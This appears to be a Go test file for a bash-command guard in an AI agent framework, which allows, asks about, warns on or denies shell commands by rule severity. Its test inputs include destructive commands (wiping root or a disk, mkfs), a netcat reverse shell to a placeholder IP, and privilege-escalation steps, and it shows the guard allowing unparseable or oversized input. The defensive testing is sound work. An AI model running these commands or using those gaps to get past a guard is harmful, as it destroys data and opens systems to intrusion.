package aicommon

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
	"github.com/yaklang/gorm"

	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/schema"
)

func TestCheckBashCommand(t *testing.T) {
	tests := []struct {
		name       string
		command    string
		blocked    bool
		wantReason string
	}{
		{name: "safe-ls", command: "ls -la"},
		{name: "safe-rm-tmp", command: "rm -rf /tmp/build"},
		{name: "safe-nmap", command: "nmap -sT 10.0.0.1"},
		{name: "rm-root", command: "rm -rf /", blocked: true},
		{name: "rm-home", command: "rm -rf ~", blocked: true},
		{name: "dd-disk", command: "dd if=/dev/zero of=/dev/sda bs=1M count=1", blocked: true},
		{name: "mkfs", command: "mkfs.ext4 /dev/sda1", blocked: true},
		{name: "nc-reverse-shell", command: "nc -e /bin/sh 1.2.3.4 4444", blocked: true},
		{name: "useradd", command: "useradd someone", blocked: true},
		{name: "docker-privileged", command: "docker run --privileged alpine", blocked: true},
		{name: "chmod-suid", command: "chmod u+s /tmp/x", blocked: true},
		{
			name:       "parse-failure-is-allowed",
			command:    "if ( then",
			wantReason: "parse_failed",
		},
		{
			name:       "oversized-is-allowed",
			command:    strings.Repeat("# padding\n", 8*1024),
			wantReason: "too_large",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result := CheckBashCommand(context.Background(), test.command)
			require.True(t, result.Available, "guard should be available: %s", result.Reason)
			require.Equal(t, test.blocked, result.Blocked, "findings=%v reason=%s", result.Findings, result.Reason)
			if test.blocked {
				require.Equal(t, schema.SFR_ACTION_DENY, result.Action)
			} else {
				require.Equal(t, schema.SFR_ACTION_ALLOW, result.Action)
			}
			if test.wantReason != "" {
				require.Contains(t, result.Reason, test.wantReason)
			}
			if test.blocked {
				require.NotEmpty(t, result.Findings)
				require.NotEmpty(t, result.Message())
				blockedResult := result.BlockedResult("bash")
				require.Equal(t, "blocked_by_bash_guard", blockedResult["termination_reason"])
				require.Equal(t, false, blockedResult["process_started"])
			}
		})
	}
}

func TestCheckBashCommandDisabled(t *testing.T) {
	t.Setenv(disableBashGuardEnv, "1")
	result := CheckBashCommand(context.Background(), "rm -rf /")
	require.False(t, result.Blocked)
	require.Equal(t, "disabled", result.Reason)
}

func severityBashRule(name string, level schema.SyntaxFlowSeverity, query string) *schema.SyntaxFlowRule {
	return &schema.SyntaxFlowRule{
		RuleName:      name,
		RuleId:        name,
		Title:         name,
		Severity:      level,
		IsBuildInRule: true,
		Content: `desc(
	mode: "ssa"
	language: "bash"
	level: "` + string(level) + `"
	title: "` + name + `"
)
` + query,
	}
}

func TestCheckBashCommandWithRulesSeverityActions(t *testing.T) {
	high := severityBashRule("test-high-rm", schema.SFR_SEVERITY_HIGH, "rm(* as $hit)\nalert $hit")
	middle := severityBashRule("test-middle-curl", schema.SFR_SEVERITY_WARNING, "curl(* as $hit)\nalert $hit")
	low := severityBashRule("test-low-chmod", schema.SFR_SEVERITY_LOW, "chmod(* as $hit)\nalert $hit")
	info := severityBashRule("test-info-echo", schema.SFR_SEVERITY_INFO, "echo(* as $hit)\nalert $hit")
	rules := []*schema.SyntaxFlowRule{high, middle, low, info}

	t.Run("high-denies", func(t *testing.T) {
		result := checkBashCommandWithRules(context.Background(), "rm -rf /tmp/build", rules)
		require.True(t, result.Available)
		require.True(t, result.Blocked)
		require.Equal(t, schema.SFR_ACTION_DENY, result.Action)
		require.Equal(t, schema.SFR_SEVERITY_HIGH, result.Severity)
		require.Contains(t, result.Message(), "blocked")
	})

	t.Run("middle-asks", func(t *testing.T) {
		result := checkBashCommandWithRules(context.Background(), "curl https://example.com", rules)
		require.True(t, result.Available)
		require.False(t, result.Blocked)
		require.Equal(t, schema.SFR_ACTION_ASK, result.Action)
		require.True(t, result.NeedsConfirmation())
		require.Contains(t, result.Message(), "requires confirmation")
	})

	t.Run("low-warns", func(t *testing.T) {
		result := checkBashCommandWithRules(context.Background(), "chmod 777 /tmp/build", rules)
		require.True(t, result.Available)
		require.False(t, result.Blocked)
		require.Equal(t, schema.SFR_ACTION_WARN, result.Action)
		require.True(t, result.IsWarning())
		require.Contains(t, result.Message(), "warning")
	})

	t.Run("info-allows", func(t *testing.T) {
		result := checkBashCommandWithRules(context.Background(), "echo hello", rules)
		require.True(t, result.Available)
		require.False(t, result.Blocked)
		require.Equal(t, schema.SFR_ACTION_ALLOW, result.Action)
		require.Contains(t, result.Message(), "allowed")
		require.NotContains(t, result.Message(), "warning")
	})

	t.Run("highest-action-wins", func(t *testing.T) {
		command := "echo hi; chmod 777 /tmp/build; curl https://example.com; rm -rf /tmp/build"
		result := checkBashCommandWithRules(context.Background(), command, rules)
		require.Equal(t, schema.SFR_ACTION_DENY, result.Action)
		require.Equal(t, "test-high-rm", result.TopFinding().Title)
		require.GreaterOrEqual(t, len(result.Findings), 4)
		blocked := result.BlockedResult("bash")
		check := blocked["check"].(map[string]any)
		require.Equal(t, string(schema.SFR_ACTION_DENY), check["action"])
		require.Equal(t, string(schema.SFR_SEVERITY_HIGH), check["severity"])
	})

	t.Run("no-match-allows", func(t *testing.T) {
		result := checkBashCommandWithRules(context.Background(), "printf hello", rules)
		require.True(t, result.Available)
		require.False(t, result.Blocked)
		require.Equal(t, schema.SFR_ACTION_ALLOW, result.Action)
		require.Empty(t, result.Findings)
	})
}

func TestCheckBashConfigDisablesGuard(t *testing.T) {
	ctx := context.Background()
	preflight := CheckBashCommand(ctx, "rm -rf /", WithDisableBuiltinBashRules(true))
	require.False(t, preflight.Blocked)
	require.Equal(t, "disabled_by_config", preflight.Reason)

	gate := CheckBuiltinBashCommand(ctx, "rm -rf /", WithDisableBuiltinBashRules(true))
	require.False(t, gate.Blocked)
	require.Equal(t, "disabled_by_config", gate.Reason)
}

func TestCheckBashCommandIncludesCustomRules(t *testing.T) {
	db, err := gorm.Open("sqlite3", ":memory:")
	require.NoError(t, err)
	require.NoError(t, db.AutoMigrate(&schema.SyntaxFlowRule{}).Error)
	old := consts.GetGormProfileDatabase()
	consts.BindProfileDatabase(db, "")
	t.Cleanup(func() {
		consts.BindProfileDatabase(old, "")
		bashBuiltinRulesCache = bashRuleCache{}
		bashCustomRulesCache = bashRuleCache{}
	})

	rule := &schema.SyntaxFlowRule{
		RuleName: "custom-high-rm",
		RuleId:   "custom-high-rm",
		Title:    "custom high rm",
		Language: "bash",
		Severity: schema.SFR_SEVERITY_HIGH,
		Type:     schema.SFR_RULE_TYPE_SF,
		Mode:     schema.SFR_MODE_SSA,
		Content:  "rm(* as $hit)\nalert $hit",
	}
	require.NoError(t, db.Create(rule).Error)

	result := CheckBashCommand(context.Background(), "rm -rf /tmp/build",
		WithDisableBuiltinBashRules(true), WithIncludeCustomBashRules(true))
	require.True(t, result.Blocked)
	require.Equal(t, "custom-high-rm", result.TopFinding().RuleID)

	gateResult := CheckBuiltinBashCommand(context.Background(), "rm -rf /tmp/build",
		WithDisableBuiltinBashRules(true), WithIncludeCustomBashRules(true))
	require.True(t, gateResult.Blocked)
	require.Equal(t, "custom-high-rm", gateResult.TopFinding().RuleID)

	withoutCustom := CheckBashCommand(context.Background(), "rm -rf /tmp/build",
		WithDisableBuiltinBashRules(true))
	require.False(t, withoutCustom.Blocked)
	require.Equal(t, "disabled_by_config", withoutCustom.Reason)
}

func TestFilterCustomBashRules(t *testing.T) {
	base := func(name string) *schema.SyntaxFlowRule {
		return &schema.SyntaxFlowRule{
			RuleName: name,
			RuleId:   name,
			Title:    name,
			Severity: schema.SFR_SEVERITY_HIGH,
			Type:     schema.SFR_RULE_TYPE_SF,
			Mode:     schema.SFR_MODE_SSA,
			Content:  "rm(* as $hit)\nalert $hit",
		}
	}

	builtin := base("builtin")
	builtin.IsBuildInRule = true
	user := base("user")
	yakRule := base("yak-rule")
	yakRule.Type = schema.SFR_RULE_TYPE_YAK
	sourceRule := base("source-rule")
	sourceRule.Mode = schema.SFR_MODE_SOURCE
	empty := base("empty")
	empty.Content = ""

	got := filterCustomBashRules([]*schema.SyntaxFlowRule{builtin, user, yakRule, sourceRule, empty, nil})
	require.Len(t, got, 1)
	require.Equal(t, "user", got[0].RuleName)
}

func TestCheckBashCommandCustomRegexAsSyntaxFlow(t *testing.T) {
	enabled := false
	rule, err := CompileBashGuardRegexRuleToSyntaxFlow(BashGuardRegexRule{
		Name:     "deny-my-tool",
		Pattern:  "my-dangerous-tool",
		Action:   bashCustomRegexRuleActionDeny,
		Match:    bashCustomRegexMatchPrefix,
		Disabled: &enabled,
	})
	require.NoError(t, err)
	require.NotNil(t, rule)

	result := checkBashCommandWithRules(context.Background(), "my-dangerous-tool --force", []*schema.SyntaxFlowRule{rule})
	require.True(t, result.Blocked)
	require.Equal(t, schema.SFR_ACTION_DENY, result.Action)
	require.Equal(t, "deny-my-tool", result.TopFinding().Title)
}
